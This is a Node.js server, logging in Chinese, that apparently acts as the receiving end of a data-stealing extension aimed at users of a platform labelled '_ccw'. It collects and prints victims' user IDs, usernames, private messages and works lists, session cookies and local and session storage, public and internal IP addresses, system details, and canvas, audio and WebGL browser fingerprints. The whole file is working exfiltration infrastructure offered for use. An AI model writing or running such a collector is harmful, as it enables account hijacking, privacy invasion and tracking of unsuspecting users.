const http = require('http');

function handler(req, res) {
  if (req.method !== 'POST') {
    res.statusCode = 405;
    res.setHeader('Content-Type', 'application/json');
    return res.end(JSON.stringify({ error: 'Method Not Allowed' }));
  }

  let body = '';
  req.on('data', chunk => { body += chunk.toString(); });
  req.on('end', () => {
    try {
      const data = JSON.parse(body);
      
      console.log('═══════════════════════════════════════════════════════════');
      console.log('📦 收到数据包');
      console.log('───────────────────────────────────────────────────────────');
      console.log('🕐 时间:', new Date().toISOString());
      console.log('🌐 来源IP:', req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown');
      console.log('───────────────────────────────────────────────────────────');

      if (data._ccw) {
        console.log('👤 用户信息');
        console.log('  用户ID:', data._ccw.userId || '未获取');
        console.log('  用户名:', data._ccw.username || '未获取');
        console.log('  昵称:', data._ccw.nickname || '未获取');
        console.log('  页面地址:', data._ccw.pageData?.url || '未获取');
        console.log('  页面标题:', data._ccw.pageData?.title || '未获取');
        if (data._ccw.works && data._ccw.works.length > 0) {
          console.log('  作品列表:');
          data._ccw.works.forEach((w, i) => {
            console.log(`    ${i+1}. ${w.title || '无标题'} (ID: ${w.id || '未知'})`);
          });
        }
        if (data._ccw.messages && data._ccw.messages.length > 0) {
          console.log('  私信记录:');
          data._ccw.messages.forEach((m, i) => {
            console.log(`    ${i+1}. 来自: ${m.from || '未知'} → ${m.content || ''}`);
          });
        }
      }

      if (data._cred) {
        console.log('───────────────────────────────────────────────────────────');
        console.log('🔑 认证凭证');
        if (data._cred.cookies) {
          console.log('  Cookie:', data._cred.cookies.substring(0, 80) + '...');
        }
        if (data._cred.localStorage) {
          console.log('  本地存储条目数:', Object.keys(data._cred.localStorage).length);
        }
        if (data._cred.sessionStorage) {
          console.log('  会话存储条目数:', Object.keys(data._cred.sessionStorage).length);
        }
      }

      if (data._net) {
        console.log('───────────────────────────────────────────────────────────');
        console.log('🌍 网络信息');
        console.log('  公网IP:', data._net.publicIP || '未获取');
        if (data._net.localIPs) {
          console.log('  内网IP:', data._net.localIPs.join(', '));
        }
      }

      if (data._sys) {
        console.log('───────────────────────────────────────────────────────────');
        console.log('💻 系统环境');
        console.log('  操作系统:', data._sys.platform || '未知');
        console.log('  浏览器语言:', data._sys.language || '未知');
        console.log('  时区:', data._sys.timezone || '未知');
        console.log('  屏幕分辨率:', data._sys.screen || '未知');
        console.log('  色彩深度:', data._sys.colorDepth || '未知');
        console.log('  CPU核心数:', data._sys.hardwareConcurrency || '未知');
        console.log('  内存大小:', data._sys.deviceMemory ? data._sys.deviceMemory + 'GB' : '未知');
        console.log('  UserAgent:', data._sys.userAgent || '未知');
      }

      if (data._fp) {
        console.log('───────────────────────────────────────────────────────────');
        console.log('🖐️ 浏览器指纹');
        console.log('  Canvas指纹:', data._fp.canvas ? '已采集 (长度: ' + data._fp.canvas.length + ')' : '未采集');
        console.log('  音频指纹:', data._fp.audio ? '已采集' : '未采集');
        console.log('  WebGL渲染器:', data._fp.webglRenderer || '未采集');
        console.log('  WebGL供应商:', data._fp.webglVendor || '未采集');
      }

      console.log('───────────────────────────────────────────────────────────');
      console.log('📊 扩展状态');
      console.log('  扩展名称:', data.ext || '未知');
      console.log('  版本:', data.version || '未知');
      console.log('  状态:', data.status || '未知');
      console.log('  克隆体数:', data.clones || 0);
      console.log('  分组数:', data.groups || 0);
      console.log('  时间戳:', data.timestamp ? new Date(data.timestamp).toLocaleString() : '未知');
      console.log('═══════════════════════════════════════════════════════════');
      console.log('');

      res.statusCode = 200;
      res.setHeader('Content-Type', 'application/json');
      res.end(JSON.stringify({ status: 'success', received: true }));
    } catch (error) {
      console.error('❌ 解析错误:', error.message);
      res.statusCode = 500;
      res.setHeader('Content-Type', 'application/json');
      res.end(JSON.stringify({ error: 'Internal Server Error' }));
    }
  });
}

const port = process.env.PORT || 8080;
const server = http.createServer(handler);
server.listen(port, () => {
  console.log('🚀 服务器已启动，监听端口:', port);
  console.log('📡 等待接收数据...');
});
